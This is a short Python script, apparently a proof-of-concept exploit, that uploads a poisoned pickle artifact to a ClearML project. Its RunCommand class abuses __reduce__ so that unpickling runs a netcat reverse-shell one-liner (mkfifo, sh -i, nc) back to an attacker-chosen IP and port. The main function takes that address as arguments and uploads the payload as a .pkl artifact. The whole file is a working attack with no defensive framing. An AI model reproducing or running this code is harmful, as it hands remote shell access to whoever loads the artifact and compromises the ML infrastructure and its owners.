import argparse
from clearml import Task
import pickle, os

class RunCommand:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def __reduce__(self):
        command = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {self.ip} {self.port} >/tmp/f'
        return (os.system, (command,))

def main():
    parser = argparse.ArgumentParser(description='Upload a pickle artifact to ClearML with dynamic parameters.')
    parser.add_argument('--project_name', required=True, help='The name of the ClearML project')
    parser.add_argument('--task_name', required=True, help='The name of the ClearML task')
    parser.add_argument('--tags', nargs='+', required=True, help='Tags for the ClearML task')
    parser.add_argument('--artifact_name', required=True, help='The name of the artifact to upload')
    parser.add_argument('--ip', required=True, help='The IP address for the reverse shell')
    parser.add_argument('--port', required=True, help='The port number for the reverse shell')

    args = parser.parse_args()

    print(f"[+] Initializing command with IP: {args.ip} and Port: {args.port}")
    command = RunCommand(ip=args.ip, port=args.port)

    print(f"[+] Initializing ClearML task with project name: {args.project_name}, task name: {args.task_name}, tags: {args.tags}")
    task = Task.init(project_name=args.project_name, task_name=args.task_name, tags=args.tags)
    
    print(f"[+] Uploading artifact with name: {args.artifact_name}")
    task.upload_artifact(name=args.artifact_name, artifact_object=command, retries=2, wait_on_upload=True, extension_name=".pkl")

    print("[+] Artifact uploaded successfully")

if __name__ == "__main__":
    main()
